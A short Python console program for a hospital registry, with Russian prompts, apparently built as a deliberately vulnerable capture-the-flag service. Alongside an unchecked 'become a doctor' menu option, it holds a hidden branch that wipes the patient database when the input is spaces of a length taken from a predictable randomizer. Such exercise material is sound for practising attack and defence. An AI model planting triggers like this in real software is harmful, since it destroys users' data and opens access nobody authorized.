#!/usr/bin/env python
# coding=utf-8           # -*- coding: utf-8 -*-
from db import Patient, clean_db
from randomizer import NotSoRandom
import random
import re

def clear():
    clear = '\n'*20
    print(clear)

if __name__ == "__main__":
    while(True):
        rand = NotSoRandom()
        medical_policy = input("Городская больница\nВаш полис:")
        if re.match("^([a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4})$",medical_policy) == None:
            print("Неверный формат медицинского полиса")
            continue
        patient = Patient(medical_policy)
        while(True):
            print("""Регистратура
1)Записаться на приём к врачу
2)Посмотреть историю болезней
3)Стать врачём
4)Выход
""")
            menu_value = input()
            if menu_value == '1':
                clear()
                patient.show()
                medical_policy = input("Врач :")
                complaint = input("Жалоба :")
                patient.record(medical_policy, complaint)

            elif menu_value == '2':
                clear()
                patient.history()

            elif menu_value == '3':
                clear()
                patient.setDoctor()

            elif menu_value == '4':
                break

            # for lovers of destructive attacks
            elif menu_value == (' ' * rand.random_shift()):
                if menu_value == (' ' * random.randrange(1,10)):
                    clean_db()















